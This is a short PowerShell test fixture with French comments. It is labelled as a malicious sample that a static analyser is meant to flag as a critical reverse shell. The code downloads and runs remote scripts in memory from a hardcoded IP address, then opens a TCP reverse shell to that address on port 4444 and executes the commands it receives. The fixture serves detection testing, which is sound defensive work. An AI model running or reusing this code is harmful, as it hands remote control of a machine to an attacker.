# ECHANTILLON MALVEILLANT - NE PAS EXECUTER
# Reverse shell PowerShell + telechargement de charge utile distante.
# Fichier de TEST pour l'analyseur statique : il doit etre DETECTE, pas lance.
# Doit declencher : PowerShell_Reverse_Shell (CRITICAL).

# --- Etape 1 : recuperation d'une charge utile distante et execution en memoire
$url = "http://185.220.101.47/stage2.ps1"
IEX(New-Object Net.WebClient).DownloadString($url)
Invoke-Expression (New-Object System.Net.WebClient).DownloadString("http://185.220.101.47/loader.ps1")

# --- Etape 2 : reverse shell TCP brut vers le serveur de l'attaquant
$client = New-Object System.Net.Sockets.TCPClient("185.220.101.47", 4444)
$stream = $client.GetStream()
$buffer = New-Object byte[] 1024

while (($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
    $data = (New-Object System.Text.ASCIIEncoding).GetString($buffer, 0, $i)
    $sortie = (Invoke-Expression $data 2>&1 | Out-String)
    $envoi = ([Text.Encoding]::ASCII).GetBytes($sortie + "PS> ")
    $stream.Write($envoi, 0, $envoi.Length)
    $stream.Flush()
}

$client.Close()
